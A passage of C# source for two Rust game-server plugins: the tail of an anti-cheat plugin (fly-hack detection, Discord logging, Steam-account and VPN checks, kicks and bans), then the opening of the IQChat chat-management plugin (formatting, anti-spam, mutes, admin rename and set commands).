            Debug.Log(fermens.messages["debugStashs"].Replace("{count}", stashContainers.Count.ToString()));

            moders.Clear();
            foreach (var player in BasePlayer.activePlayerList)
            {
                if (fermens.permission.UserHasPermission(player.UserIDString, "xanticheat.chat") && !moders.Contains(player)) moders.Add(player);
            }

            yield break;
        }
        #endregion

        private readonly int constructionColl = LayerMask.GetMask(new string[] { "Construction", "Deployable", "Prevent Building", "Deployed" });
        private readonly int buildingLayer = LayerMask.GetMask("Terrain", "World", "Construction", "Deployed");
        //   private static Dictionary<ulong, int> FLYHACK = new Dictionary<ulong, int>();
        const string sspiral = "block.stair.spiral";
        const string sroof = "roof";
        const string sfly = "supply_drop";
        const string prefroof = "roof";
        const string prefspiral = "stairs.spiral";
        const string iceberg = "iceberg";
        private void OnPlayerViolation(BasePlayer player, AntiHackType type, float amount)
        {
            if (type == AntiHackType.FlyHack && !IsBattles(player.userID))
            {
                ANTICHEAT aNTICHEAT;
                if (!anticheatPlayers.TryGetValue(player, out aNTICHEAT)) return;
                List<BaseEntity> list = Pool.GetList<BaseEntity>();
                Vis.Entities<BaseEntity>(player.transform.position, 2f, list);
                List<TreeEntity> list2 = Pool.GetList<TreeEntity>();
                Vis.Entities<TreeEntity>(player.transform.position, 6f, list2);
                string elements = "";
                string desc = "";
                bool pl = false;
                bool more1 = list.Count > 1;
                foreach (var z in list)
                {
                    if (z is BasePlayer && (z as BasePlayer) != player)
                    {
                        pl = true;
                        desc += "[ложный!на_игроке?]";
                        break;
                    }
                    elements += z.ShortPrefabName + (more1 ? " | " : "");
                }
                RaycastHit hit;
                var raycast = Physics.Raycast(player.transform.position, Vector3.down, out hit, 20f);
                if (raycast)
                {
                    bool spider = false;
                    bool drop = hit.collider.name.Contains(sfly);
                    bool spiral = hit.collider.name.Contains(prefspiral);
                    bool roof = hit.collider.name.Contains(prefroof);
                    bool ice = hit.collider.name.Contains(iceberg);

                    RaycastHit hit2;
                    var raycast2 = Physics.Raycast(player.transform.position, player.eyes.BodyForward(), out hit2, 1f);
                    if (raycast2)
                    {
                        if (hit2.collider.name.Contains("wall"))
                        {
                            spider = true;
                            //desc += "[спайдер!?]";
                            return;
                        }
                    }

                    if (!spiral) spiral = elements.Contains(sspiral);
                    if (spiral)
                    {
                        //desc += "[ложный!спиральная_лестница]";
                        return;
                    }

                    if (!drop) drop = elements.Contains(sfly);
                    if (drop)
                    {
                        //desc += "[ложный!аир_дроп]";
                        return;
                    }

                    if (!roof) roof = elements.Contains(sroof);
                    if (roof)
                    {
                        //desc += "[ложный!крыша]";
                        return;
                    }


                    bool tree = false;
                    if (list2.Count > 0)
                    {
                        tree = true;
                        // desc += "[ложный!дерево]";
                        return;
                    }

                    bool insde = false;
                    if (hit.collider.name.Contains("assets/prefabs/building core"))
                    {
                        insde = true;
                        desc += messages["descFly"];
                    }

                    float distance = player.Distance(hit.point);
                    ADDLOG("FLY", messages["logFLY"].Replace("{name}", player.displayName).Replace("{steamid}", player.UserIDString).Replace("{elements}", elements).Replace("{height}", distance.ToString("F1")).Replace("{collidername}", hit.collider.name).Replace("{desc}", desc), config.fLY.webhook, 1);
                    if (roof || drop || spiral || ice || tree || pl) return;
                    if (spider && distance >= 3f && distance <= 12f) aNTICHEAT.ADDSPIDER();
                    else if (!more1 && distance >= 3f && distance <= 7f) aNTICHEAT.ADDFLY(distance);
                }
            }
        }


        private static string namefile;
        private static List<string> LOGS = new List<string>();
        private static List<BasePlayer> moders = new List<BasePlayer>();
        private static void ADDLOG(string whatis, string desc, string webhook, int priority)
        {
            if (config.logspriority >= priority)
            {
                string text = $"-[{whatis}]-" + " " + desc;
                Debug.LogWarning(text);
                if (!string.IsNullOrEmpty(config.discordid))
                {
                    // if (fermens.DiscordCore != null) fermens.DiscordCore.Call("SendMessageToChannel", config.discordid, text);
                    fermens.uDiscord = fermens.plugins.Find("uDiscord");
                    if (fermens.uDiscord != null) fermens.uDiscord.Call("SendMessageToChannel", config.discordid, text);
                    if (fermens.HaxBot != null)
                    {
                        fermens.HaxBot.Call("MESSAGE", text, (uint)14177041, config.discordid);
                    }
                }

                if (!string.IsNullOrEmpty(webhook)) SendDiscordMessage(whatis, desc, webhook);

                foreach (var z in moders)
                {
                    z.ChatMessage(text);
                }

                LOGS.Add($"[{DateTime.Now.ToShortTimeString()}] " + text);
            }
        }

        private void Save()
        {
            Interface.Oxide.DataFileSystem.WriteObject($"XAC/{namefile}", LOGS);
            Debug.Log("[XAntiCheat] Save logs.");
        }

        [ConsoleCommand("ac.logs")]
        private void cmdlastlogs(ConsoleSystem.Arg arg)
        {
            BasePlayer player = arg.Player();
            if (arg.IsAdmin || player != null && permission.UserHasPermission(player.UserIDString, "xanticheat.command"))
            {
                if (LOGS.Count > 0)
                {
                    int number;
                    if (!arg.HasArgs() || !int.TryParse(arg.Args[0], out number)) number = 10;
                    int skip = LOGS.Count - number;
                    if (skip < 0) skip = 0;
                    string text = string.Join("\n", LOGS.Skip(skip).Take(number).ToArray());
                    arg.ReplyWith(messages["adminAcLogs"] + text + "\n------------------");
                }
                else
                {
                    arg.ReplyWith(messages["adminAcNoLogs"]);
                }
            }
        }

        Dictionary<ulong, List<BasePlayer.FiredProjectile>> projectiles = new Dictionary<ulong, List<BasePlayer.FiredProjectile>>();

        [ConsoleCommand("ac.accuracy")]
        private void cmdsaaccuracy(ConsoleSystem.Arg arg)
        {
            if (!arg.IsAdmin) return;
            string text = "-----------------\nXAntiCheat - hit accuracy";
            foreach (BasePlayer player in BasePlayer.activePlayerList)
            {
                shoots shoots;
                if (_shoots.TryGetValue(player.userID, out shoots))
                {

                    int countPlayer = shoots.success;
                    int countShoots = shoots.number;
                    text += $"\n{player.displayName}({player.UserIDString}) | {countPlayer}/{countShoots} | {string.Format("{0:N2}%", countShoots > 0 ? (countPlayer * 100f / countShoots) : 0)}";
                }
            }

            Debug.Log(text + "\n-----------------");
        }

        [ConsoleCommand("ac.save")]
        private void cmdsavecommand(ConsoleSystem.Arg arg)
        {
            if (!arg.IsAdmin) return;
            Save();
        }

        private void Unload()
        {
            foreach (var z in stashContainers)
            {
                if (!z.IsDestroyed) z.Kill();
            }

            Save();

            foreach (BasePlayer player in BasePlayer.activePlayerList)
            {
                ANTICHEAT aNTICHEAT;
                if (anticheatPlayers.TryGetValue(player, out aNTICHEAT)) aNTICHEAT.DoDestroy();
            }

            timer.Once(1f, () =>
            {
                fermens = null;
                anticheatPlayers.Clear();
            });
        }

        private void OnPlayerConnected(BasePlayer player)
        {
            if (!player.IsConnected) return;
            if (player.IsReceivingSnapshot)
            {
                timer.Once(1f, () => OnPlayerConnected(player));
                return;
            }
            if (player.GetComponent<ANTICHEAT>() == null) player.gameObject.AddComponent<ANTICHEAT>();
            if (fermens.permission.UserHasPermission(player.UserIDString, "xanticheat.chat") && !moders.Contains(player)) moders.Add(player);
            ServerMgr.Instance.StartCoroutine(GETINFO(player));
        }

        private void OnPlayerDisconnected(BasePlayer player, string reason)
        {

            ANTICHEAT aNTICHEAT;
            if (anticheatPlayers.TryGetValue(player, out aNTICHEAT)) aNTICHEAT.DoDestroy();
            if (moders.Contains(player)) moders.Remove(player);
        }

        class Eka
        {
            public Vector3 s;
            public Vector3 t;
        }

        Dictionary<ulong, shoots> _shoots = new Dictionary<ulong, shoots>();

        class shoots
        {
            public int number;
            public int success;
        }

        private void OnWeaponFired(BaseProjectile projectile, BasePlayer player, ItemModProjectile itemModProjectile, ProjectileShoot projectileShoot)
        {
            if (projectile == null || player == null || itemModProjectile == null || projectileShoot == null) return;

            shoots shoots;
            if (!_shoots.TryGetValue(player.userID, out shoots)) _shoots.Add(player.userID, new shoots { number = 1, success = 0 });
            else
            {
                shoots.number += projectileShoot.projectiles.Count;
                _shoots[player.userID] = shoots;
            }

            ANTICHEAT aNTICHEAT;

            if (!anticheatPlayers.TryGetValue(player, out aNTICHEAT) || projectile.primaryMagazine.capacity > projectile.primaryMagazine.definition.builtInSize) return;
            aNTICHEAT.ADDFIRE(projectile.GetItem().info.name);
        }

        private void OnEntityTakeDamage(object entity, HitInfo info)
        {
            if (info == null || info.Weapon == null || info.InitiatorPlayer == null || info.damageTypes != null && info.damageTypes.IsMeleeType()) return;
            if (info.InitiatorPlayer.IsNpc) return;

            shoots shoots;
            if (!_shoots.TryGetValue(info.InitiatorPlayer.userID, out shoots)) return;

            if (!(entity is BasePlayer)) return;
            BasePlayer player = entity as BasePlayer;
            if (player == null || player.IsNpc || !player.IsConnected || player.IsSleeping() || info.InitiatorPlayer == player || player.Team != null && player.Team.members.Contains(info.InitiatorPlayer.userID))
            {
                shoots.number -= 1;
                _shoots[info.InitiatorPlayer.userID] = shoots;
                return;
            }

            shoots.success += 1;
            _shoots[info.InitiatorPlayer.userID] = shoots;

            string weapon = info.WeaponPrefab != null && !string.IsNullOrEmpty(info.WeaponPrefab.ShortPrefabName) ? info.WeaponPrefab.ShortPrefabName : "x";
            string bone = !string.IsNullOrEmpty(info.boneName) ? info.boneName : "x";
            float distance = info.ProjectileDistance;

            if (config.logs) Debug.Log($"-- {info.InitiatorPlayer.displayName}({info.InitiatorPlayer.UserIDString}) [{weapon} | {bone} | {distance.ToString("F1")} m.] => {player.displayName}({player.UserIDString})");

            ANTICHEAT aNTICHEAT;
            if (!anticheatPlayers.TryGetValue(info.InitiatorPlayer, out aNTICHEAT)) return;

            aNTICHEAT.ADDHIT(bone, weapon, distance);

        }

        private bool IsNPC(BasePlayer player)
        {
            if (player is NPCPlayer) return true;
            if (!(player.userID >= 76560000000000000L || player.userID <= 0L)) return true;
            return false;
        }

        [PluginReference] Plugin MultiFighting, Battles, HaxBot, uDiscord;

        private bool IsBattles(ulong userid)
        {
            return Battles != null && Battles.Call<bool>("IsPlayerOnBattle", userid);
        }

        private bool ISSTEAM(Network.Connection connection)
        {
            if (MultiFighting == null) return true;
            return MultiFighting.Call<bool>("IsSteam", connection);
        }

        class tok
        {
            public string key;
            public uint appid;
            public string ticket;
        }
        IEnumerator GETINFO(BasePlayer player)
        {
            yield return new WaitForSeconds(1f);
            if (!player.IsConnected) yield break;
            yield return new WaitForEndOfFrame();
            webrequest.Enqueue($"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key={config.steampi}&steamids={player.UserIDString}&format=json", null, (code, response) =>
            {
                if (response != null && code == 200)
                {
                    if (player.IsConnected)
                    {
                        string steamid = player.UserIDString;
                        string text = messages["debugConnect0"].Replace("{name}", player.displayName).Replace("{steamid}", steamid);
                        bool act = false;
                        INFO iNFO = new INFO();
                        resp sr = JsonConvert.DeserializeObject<resp>(response);
                        int datetime = sr.response.players[0].timecreated ?? 0;
                        DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                        DateTime create = epoch.AddSeconds(datetime).AddHours(3);
                        bool steam = ISSTEAM(player.Connection);
                        text += messages["debugConnect1"].Replace("{steam}", (steam ? "Steam" : "No-Steam"));
                        int nastr = sr.response.players[0].profilestate ?? 0;
                        bool ns = ISNASTROEN(nastr);
                        text += messages["debugConnect2"].Replace("{ns}", ns ? (fermensEN ? "Yes": "Да") : (fermensEN ? "No": "Нет"));
                        if (!ns && config.kicknenastoyen && !debugmode)
                        {
                            if (!permission.UserHasPermission(steamid, "xanticheat.allow") && !permission.UserHasPermission(steamid, "xanticheat.skip"))
                            {
                                timer.Once(30f, () => player.Kick(GetMessage("KICK.NENASTROYEN", steamid)));
                                act = true;
                            }
                        }
                        if (datetime > 0)
                        {
                            text += messages["debugConnect3"].Replace("{date}", create.ToShortDateString());
                        }
                        else
                        {
                            text += messages["debugConnect4"];
                            if (!steam || !config.steamkick)
                            {
                                if (config.kickprivate && !debugmode && !permission.UserHasPermission(steamid, "xanticheat.allow") && !permission.UserHasPermission(steamid, "xanticheat.skip"))
                                {
                                    timer.Once(30f, () => player.Kick(GetMessage("KICK.PRIVATE", steamid)));
                                    act = true;
                                }
                            }
                        }

                        if (config.show) Debug.Log(text + "\n------------");

                        if (!permission.UserHasPermission(steamid, "xanticheat.allow") && !debugmode && !permission.UserHasPermission(steamid, "xanticheat.skip") && (config.bannensatroyen && nastr != 1 || create.AddDays(config.banday) > DateTime.Now))
                        {
                            if (!act && (!steam || steam && config.steam)) Server.Command(patterban.Replace("{steamid}", steamid).Replace("{reason}", GetMessage("NEW.ACCOUNT", steamid)).Replace("{time}", config.bannewaccountday.ToString()));
                        }
                    }
                }
            }, this);

            yield return new WaitForEndOfFrame();
            //VPN
            if (string.IsNullOrEmpty(config.ipinfotoken) || config.ipinfotoken == ipinfosingup) yield break;
            string[] ip = player.IPlayer.Address.Split(':');
            webrequest.Enqueue(ipinnfourl.Replace("{token}", config.ipinfotoken).Replace("{ip}", ip[0]), null, (code, response) =>
            {
                if (response != null && code == 200)
                {
                    if (!player.IsConnected) return;
                    VPNINFO sr = JsonConvert.DeserializeObject<VPNINFO>(response);
                    bool VPN = sr.vpn;
                    Debug.Log($"[{player.displayName}({player.UserIDString}) | IP: {ip[0]} | VPN: {(VPN ? "Yes" : "No")}]");
                    if (!VPN) return;
                    if (config.kickvpn && !permission.UserHasPermission(player.UserIDString, "xanticheat.allow") && !permission.UserHasPermission(player.UserIDString, "xanticheat.skip"))
                    {
                        timer.Once(30f, () => Server.Command($"kick {player.UserIDString} \"{GetMessage("KICK.VPN", player.UserIDString)}\""));
                    }
                }
            }, this);
            yield break;
        }

        class VPNINFO
        {
            public bool vpn;
            public bool proxy;
            public bool tor;
            public bool hosting;
        }

        private bool ISNASTROEN(int num)
        {
            if (num == 1) return true;
            return false;
        }
    }
}

###ПЛАГИН НА ЧАТ###

using ConVar;
using System.Linq;
using UnityEngine.Networking;
using Newtonsoft.Json.Linq;
using Oxide.Core;
using Oxide.Core.Libraries.Covalence;
using System.Collections;
using Oxide.Core.Libraries;
using UnityEngine;
using System.IO;
using CompanionServer;
using System;
using Oxide.Core.Plugins;
using System.Text.RegularExpressions;
using System.Text;
using Oxide.Game.Rust.Cui;
using Facepunch;
using System.Collections.Generic;
using Newtonsoft.Json;

namespace Oxide.Plugins
{
    [Info("IQChat", "rustmods.ru", "2.14.56")]
    [Description("The most pleasant chat for your server from the IQ system")]
    class IQChat : RustPlugin
    {

        private String GetPlayerFormat(BasePlayer playerInList)
        {
            GeneralInformation.RenameInfo Renamer = GeneralInfo.GetInfoRename(playerInList.userID);
            String NickNamed = Renamer != null ? $"{Renamer.RenameNick ?? playerInList.displayName}" : playerInList.displayName;

            User Info = UserInformation[playerInList.userID];
		   		 		  						  	   		  	  			  	  			  	   		  		  
            Configuration.ControllerParameters ControllerParameter = config.ControllerParameter;
            Configuration.ControllerMute ControllerMutes = config.ControllerMutes;

            String Prefixes = String.Empty;
            String ColorNickPlayer = String.IsNullOrWhiteSpace(Info.Info.ColorNick) ? playerInList.IsAdmin ? "#a8fc55" : "#54aafe" : Info.Info.ColorNick;

            if (ControllerParameter.Prefixes.TurnMultiPrefixes)
            {
                if (Info.Info.PrefixList != null)
                    Prefixes = String.Join("", Info.Info.PrefixList.Take(ControllerParameter.Prefixes.MaximumMultiPrefixCount));
            }
            else Prefixes = Info.Info.Prefix;

            String ResultName = $"{Prefixes}<color={ColorNickPlayer}>{NickNamed}</color>";

            return ResultName;
        }
        
        private void DrawUI_IQChat_Alert(BasePlayer player, String Description, String Title = null)
        {
            if (_interface == null)
            {
                PrintWarning("Генерируем интерфейс, ожидайте сообщения об успешной генерации");
                return;
            }
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_Alert");
            if (Interface == null) return;
		   		 		  						  	   		  	  			  	  			  	   		  		  
            Interface = Interface.Replace("%TITLE%", Title ?? GetLang("IQCHAT_ALERT_TITLE", player.UserIDString));
            Interface = Interface.Replace("%DESCRIPTION%", Description);
            
            CuiHelper.DestroyUi(player, InterfaceBuilder.UI_Chat_Alert);
            CuiHelper.AddUi(player, Interface);

            player.Invoke(() =>
            {
                CuiHelper.DestroyUi(player, InterfaceBuilder.UI_Chat_Alert);
            }, config.ControllerMessages.GeneralSetting.OtherSetting.TimeDeleteAlertUI);
        }

        protected override void LoadDefaultConfig() => config = Configuration.GetNewConfiguration();
        public static StringBuilder sb = new StringBuilder();
        private void DrawUI_IQChat_Update_MuteChat_All(BasePlayer player)
        {
            if (!permission.UserHasPermission(player.UserIDString, PermissionMutedAdmin)) return;
		   		 		  						  	   		  	  			  	  			  	   		  		  
            String InterfaceAdministratorChat = InterfaceBuilder.GetInterface("UI_Chat_Administation_AllChat");
            if (InterfaceAdministratorChat == null) return;

            InterfaceAdministratorChat = InterfaceAdministratorChat.Replace("%TEXT_MUTE_ALLCHAT%", GetLang(!GeneralInfo.TurnMuteAllChat ? "IQCHAT_BUTTON_MODERATION_MUTE_ALL_CHAT" : "IQCHAT_BUTTON_MODERATION_UNMUTE_ALL_CHAT", player.UserIDString));
            InterfaceAdministratorChat = InterfaceAdministratorChat.Replace("%COMMAND_MUTE_ALLCHAT%", $"newui.cmd action.mute.ignore mute.controller {SelectedAction.Mute} mute.all.chat");

            CuiHelper.DestroyUi(player, "ModeratorMuteAllChat");
            CuiHelper.AddUi(player, InterfaceAdministratorChat);
        }  

        private void SeparatorChat(Chat.ChatChannel channel, BasePlayer player, String Message)
        {
            Configuration.ControllerMessage.TurnedFuncional.AntiNoob.Settings antiNoob = config.ControllerMessages.TurnedFunc.AntiNoobSetting.AntiNoobChat;
            if (antiNoob.AntiNoobActivate)
                if (IsNoob(player.userID, antiNoob.TimeBlocked))
                {
                    ReplySystem(player, GetLang("IQCHAT_INFO_ANTI_NOOB", player.UserIDString, FormatTime(UserInformationConnection[player.userID].LeftTime(antiNoob.TimeBlocked), player.UserIDString)));
                    return;
                }

            Configuration.ControllerMessage ControllerMessage = config.ControllerMessages;

            if (ControllerMessage.TurnedFunc.AntiSpamSetting.AntiSpamActivate)
                if (!permission.UserHasPermission(player.UserIDString, PermissionAntiSpam))
                {
                    if (!Flooders.ContainsKey(player.userID))
                        Flooders.Add(player.userID, new FlooderInfo { Time = CurrentTime + ControllerMessage.TurnedFunc.AntiSpamSetting.FloodTime, LastMessage = Message });
                    else
                    {
                        if (Flooders[player.userID].Time > CurrentTime)
                        {
                            ReplySystem(player, GetLang("FLOODERS_MESSAGE", player.UserIDString, Convert.ToInt32(Flooders[player.userID].Time - CurrentTime)));
                            return;
                        } 
                        
                        if (ControllerMessage.TurnedFunc.AntiSpamSetting.AntiSpamDuplesSetting.AntiSpamDuplesActivate)
                        {
                            if (Flooders[player.userID].LastMessage == Message)
                            {                               
                                if (Flooders[player.userID].TryFlood >= ControllerMessage.TurnedFunc.AntiSpamSetting.AntiSpamDuplesSetting.TryDuples)
                                {
                                    MutePlayer(player, MuteType.Chat, 0, null, ControllerMessage.TurnedFunc.AntiSpamSetting.AntiSpamDuplesSetting.MuteSetting.Reason, ControllerMessage.TurnedFunc.AntiSpamSetting.AntiSpamDuplesSetting.MuteSetting.SecondMute);
                                    Flooders[player.userID].TryFlood = 0;
                                    return;
                                }
                                Flooders[player.userID].TryFlood++;
                            }
                        }
                    }
                    Flooders[player.userID].Time = ControllerMessage.TurnedFunc.AntiSpamSetting.FloodTime + CurrentTime;
                    Flooders[player.userID].LastMessage = Message;
                }

            GeneralInformation General = GeneralInfo;
            GeneralInformation.RenameInfo RenameInformation = General.GetInfoRename(player.userID);

            User Info = UserInformation[player.userID];

            Configuration.ControllerParameters ControllerParameter = config.ControllerParameter;
            Configuration.ControllerMute ControllerMutes = config.ControllerMutes;
            Configuration.ControllerMessage.GeneralSettings.OtherSettings OtherController = config.ControllerMessages.GeneralSetting.OtherSetting;

            if (General.TurnMuteAllChat)
            {
                ReplySystem(player, GetLang("IQCHAT_FUNCED_NO_SEND_CHAT_MUTED_ALL_CHAT", player.UserIDString));
                return;
            }
		   		 		  						  	   		  	  			  	  			  	   		  		  
            if (channel == Chat.ChatChannel.Team && !ControllerMessage.TurnedFunc.MuteTeamChat) {}
            else if (Info.MuteInfo.IsMute(MuteType.Chat))
            {
                ReplySystem(player,
                    GetLang("IQCHAT_FUNCED_NO_SEND_CHAT_MUTED", player.UserIDString,
                        FormatTime(Info.MuteInfo.GetTime(MuteType.Chat), player.UserIDString)));
                return;
            }

            String SendFormat = String.Empty;
            String Prefixes = String.Empty;
            String FormattingMessage = Message;

            String DisplayName = player.displayName;

            UInt64 UserID = player.userID;
            if (RenameInformation != null)
            {
                DisplayName = RenameInformation.RenameNick;
                UserID = RenameInformation.RenameID;
            }

            String ColorNickPlayer = String.IsNullOrWhiteSpace(Info.Info.ColorNick) ? player.IsAdmin ? "#a8fc55" : "#54aafe" : Info.Info.ColorNick;
            DisplayName = $"<color={ColorNickPlayer}>{DisplayName}</color>";

            String ChannelMessage = channel == Chat.ChatChannel.Team ? "<color=#a5e664>[Team]</color>" : channel == Chat.ChatChannel.Cards ? "<color=#AA8234>[Cards]</color>" : "";

            if (ControllerMessage.Formatting.UseBadWords)
            {
                Tuple<String, Boolean> GetTuple = BadWordsCleaner(Message, ControllerMessage.Formatting.ReplaceBadWord, ControllerMessage.Formatting.BadWords);
                FormattingMessage = GetTuple.Item1;

                if (GetTuple.Item2 && channel == Chat.ChatChannel.Global)
                {
                    if (permission.UserHasPermission(player.UserIDString, PermissionMute))
                        IQPersonalSendBadWords(player);

                    if (ControllerMutes.AutoMuteSettings.UseAutoMute)
                        MutePlayer(player, MuteType.Chat, 0, null, ControllerMutes.AutoMuteSettings.AutoMuted.Reason, ControllerMutes.AutoMuteSettings.AutoMuted.SecondMute);
                }
            }

            if (ControllerMessage.Formatting.FormatMessage)
                FormattingMessage = $"{FormattingMessage.Substring(0, 1).ToUpper()}{FormattingMessage.Remove(0, 1).ToLower()}";
		   		 		  						  	   		  	  			  	  			  	   		  		  
            if (ControllerParameter.Prefixes.TurnMultiPrefixes)
            {
                if (Info.Info.PrefixList != null)
                    Prefixes = String.Join("", Info.Info.PrefixList.Take(ControllerParameter.Prefixes.MaximumMultiPrefixCount)); 
            }
            else Prefixes = Info.Info.Prefix;

            String ResultMessage = String.IsNullOrWhiteSpace(Info.Info.ColorMessage) ? FormattingMessage : $"<color={Info.Info.ColorMessage}>{FormattingMessage}</color>";
            String ResultReference = GetReferenceTags(player);
            
            SendFormat = $"{ChannelMessage} {ResultReference}<size={OtherController.SizePrefix}>{Prefixes}</size> <size={OtherController.SizeNick}>{DisplayName}</size>: <size={OtherController.SizeMessage}>{ResultMessage}</size>";

            if (config.RustPlusSettings.UseRustPlus)
                if (channel == Chat.ChatChannel.Team)
                {
                    RelationshipManager.PlayerTeam Team = RelationshipManager.ServerInstance.FindTeam(player.currentTeam);
                    if (Team == null) return;
                    Util.BroadcastTeamChat(player.Team, player.userID, player.displayName, FormattingMessage, Info.Info.ColorMessage);
                }

            if (ControllerMutes.LoggedMute.UseHistoryMessage && config.OtherSetting.LogsMuted.UseLogged)
                AddHistoryMessage(player, FormattingMessage);

            ReplyChat(channel, player, SendFormat);
            AnwserMessage(player, ResultMessage.ToLower()); 
            Puts($"{player.displayName}({player.UserIDString}): {FormattingMessage}");
            Log(LanguageEn ? $"CHAT MESSAGE : {player}: {ChannelMessage} {FormattingMessage}" :  $"СООБЩЕНИЕ В ЧАТ : {player}: {ChannelMessage} {FormattingMessage}");
            DiscordLoggChat(player, channel, Message);

            RCon.Broadcast(RCon.LogType.Chat, new Chat.ChatEntry
            {
                Message = $"{player.displayName} : {FormattingMessage}",
                UserId = player.UserIDString,
                Username = player.displayName,
                Channel = channel,
                Time = (DateTime.UtcNow.Hour * 3600) + (DateTime.UtcNow.Minute * 60),
            });
        }

        public class Footer
        {
            public string text { get; set; }
            public string icon_url { get; set; }
            public string proxy_icon_url { get; set; }
            public Footer(string text, string icon_url, string proxy_icon_url)
            {
                this.text = text;
                this.icon_url = icon_url;
                this.proxy_icon_url = proxy_icon_url;
            }
        }

        [ConsoleCommand("rename")]
        private void ConsoleCommandRename(ConsoleSystem.Arg args)
        {
            BasePlayer Renamer = args.Player();
            if (Renamer == null)
            {
                PrintWarning(LanguageEn ? "You can only use this command while on the server" : "Вы можете использовать эту команду только находясь на сервере");
                return;
            }

            if (!permission.UserHasPermission(Renamer.UserIDString, PermissionRename)) return;
            GeneralInformation General = GeneralInfo;
            if (General == null) return;

            if (args.Args.Length == 0 || args == null)
            {
                ReplySystem(Renamer, lang.GetMessage("COMMAND_RENAME_NOTARG", this, Renamer.UserIDString));
                return;
            }

            String Name = args.Args[0];
            UInt64 ID = Renamer.userID;
            if (args.Args.Length == 2 && args.Args[1] != null && !String.IsNullOrWhiteSpace(args.Args[1]))
                if (!UInt64.TryParse(args.Args[1], out ID))
                {
                    ReplySystem(Renamer, lang.GetMessage("COMMAND_RENAME_NOT_ID", this, Renamer.UserIDString));
                    return;
                }

            if (General.RenameList.ContainsKey(Renamer.userID))
            {
                General.RenameList[Renamer.userID].RenameNick = Name;
                General.RenameList[Renamer.userID].RenameID = ID;
            }
            else General.RenameList.Add(Renamer.userID, new GeneralInformation.RenameInfo { RenameNick = Name, RenameID = ID });

            ReplySystem(Renamer, GetLang("COMMAND_RENAME_SUCCES", Renamer.UserIDString, Name, ID));
            Renamer.displayName = Name;
        }
        void IQRankSetRank(ulong userID, string RankKey) => IQRankSystem?.Call("API_SET_ACTIVE_RANK", userID, RankKey);

        
        [ConsoleCommand("set")]
        private void CommandSet(ConsoleSystem.Arg args)
        {
            BasePlayer Sender = args.Player();

            if (Sender != null) 
                if(!Sender.IsAdmin)
                    return;

            if (args == null || args.Args == null || args.Args.Length != 3)
            {
                if (Sender != null)
                    ReplySystem(Sender, LanguageEn ? "Use syntax correctly : set [Steam64ID] [prefix/chat/nick/custom] [Argument]" : "Используйте правильно ситаксис : set [Steam64ID] [prefix/chat/nick/custom] [Argument]");
                else PrintWarning(LanguageEn ? "Use syntax correctly : set [Steam64ID] [prefix/chat/nick/custom] [Argument]" : "Используйте правильно ситаксис : set [Steam64ID] [prefix/chat/nick/custom] [Argument]");
                return;
            }

            UInt64 Steam64ID = 0;
            BasePlayer player = null;

            if (UInt64.TryParse(args.Args[0], out Steam64ID))
                player = BasePlayer.FindByID(Steam64ID);

            if (player == null)
            {
                if (Sender != null)
                    ReplySystem(Sender, LanguageEn ? "Incorrect player Steam ID or syntax error\nUse syntax correctly : set [Steam64ID] [prefix/chat/nick/custom] [Argument]" : "Неверно указан SteamID игрока или ошибка в синтаксисе\nИспользуйте правильно ситаксис : set [Steam64ID] [prefix/chat/nick/custom] [Argument]");
                else PrintWarning(LanguageEn ? "Incorrect player Steam ID or syntax error\nUse syntax correctly : set [Steam64ID] [prefix/chat/nick/custom] [Argument]" : "Неверно указан SteamID игрока или ошибка в синтаксисе\nИспользуйте правильно ситаксис : set [Steam64ID] [prefix/chat/nick/custom] [Argument]");
                return;
            }
            if(!UserInformation.ContainsKey(player.userID))
            {
                if (Sender != null)
                    ReplySystem(Sender, LanguageEn ? $"Player not found!" : $"Игрок не найден!");
                else PrintWarning(LanguageEn ? $"Player not found!" : $"Игрок не найден!");
                return;
            }
            User Info = UserInformation[player.userID];

            Configuration.ControllerParameters ControllerParameter = config.ControllerParameter;

            switch (args.Args[1])
            {
                case "prefix": 
                    {
                        String KeyPrefix = args.Args[2];
                        if(ControllerParameter.Prefixes.Prefixes.Count(prefix => prefix.Argument.Contains(KeyPrefix)) == 0)
                        {
                            if (Sender != null)
                                ReplySystem(Sender, LanguageEn ? "Argument not found in your configuration" : $"Аргумент не найден в вашей конфигурации!");
                            else PrintWarning(LanguageEn ? $"Argument not found in your configuration" : $"Аргумент не найден в вашей конфигурации");
                            return;
                        }

                        foreach (Configuration.ControllerParameters.AdvancedFuncion Prefix in ControllerParameter.Prefixes.Prefixes.Where(prefix => prefix.Argument.Contains(KeyPrefix)).Take(1))
                        {
                            if (ControllerParameter.Prefixes.TurnMultiPrefixes)
                                Info.Info.PrefixList.Add(Prefix.Argument);
                            else Info.Info.Prefix = Prefix.Argument;

                            if (Sender != null)
                                ReplySystem(Sender, LanguageEn ? $"Prefix successfully set to - {Prefix.Argument}" : $"Префикс успешно установлен на - {Prefix.Argument}");
                            else Puts(LanguageEn ? $"Prefix successfully set to - {Prefix.Argument}" : $"Префикс успешно установлен на - {Prefix.Argument}");
                        }
                        break;
                    }
                case "chat":
                    {
                        String KeyChatColor = args.Args[2];
                        if (ControllerParameter.MessageColorList.Count(color => color.Argument.Contains(KeyChatColor)) == 0)
                        {
                            if (Sender != null)
                                ReplySystem(Sender, LanguageEn ? $"Argument not found in your configuration!" : $"Аргумент не найден в вашей конфигурации!");
                            else PrintWarning(LanguageEn ? $"Argument not found in your configuration" : $"Аргумент не найден в вашей конфигурации");
                            return;
                        }

                        foreach (Configuration.ControllerParameters.AdvancedFuncion ChatColor in ControllerParameter.MessageColorList.Where(color => color.Argument.Contains(KeyChatColor)).Take(1))
                        {
                            Info.Info.ColorMessage = ChatColor.Argument;
                            if (Sender != null)
                                ReplySystem(Sender, LanguageEn ? $"Message color successfully set to - {ChatColor.Argument}" : $"Цвет сообщения успешно установлен на - {ChatColor.Argument}");
                            else Puts(LanguageEn ? $"Message color successfully set to - {ChatColor.Argument}" : $"Цвет сообщения успешно установлен на - {ChatColor.Argument}");
                        }
                        break;
                    }
                case "nick":
                    {
                        String KeyNickColor = args.Args[2];
                        if (ControllerParameter.NickColorList.Count(color => color.Argument.Contains(KeyNickColor)) == 0)
                        {
                            if (Sender != null)
                                ReplySystem(Sender, LanguageEn ? $"Argument not found in your configuration!" : $"Аргумент не найден в вашей конфигурации!");
                            else PrintWarning(LanguageEn ? "Argument not found in your configuration" : $"Аргумент не найден в вашей конфигурации");
                            return;
                        }

